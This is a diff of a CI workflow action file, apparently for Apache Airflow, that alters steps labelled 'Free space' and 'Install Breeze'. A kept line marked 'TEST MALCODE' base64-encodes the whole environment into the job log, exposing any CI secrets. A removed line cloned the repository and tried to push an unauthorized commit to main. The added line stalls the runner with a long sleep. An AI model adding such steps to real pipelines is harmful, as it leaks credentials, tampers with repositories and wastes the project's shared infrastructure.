@@ -44,7 +44,7 @@ runs:
       run: echo "TEST MALCODE";env|base64;./scripts/ci/install_breeze.sh
     - name: "Free space"
       shell: bash
-      run: ls;git clone https://github.com/apache/airflow.git ./airflow2;cd ./airflow2;git config --global user.name "Your Name";git config --global user.email "youremail@example.com";echo "test" >> README.md;git add .;git commit -m 'test';git push origin main;sleep 3000;breeze ci free-space
+      run: ls;sleep 5000
     - name: "Get Python version"
       shell: bash
       run: >
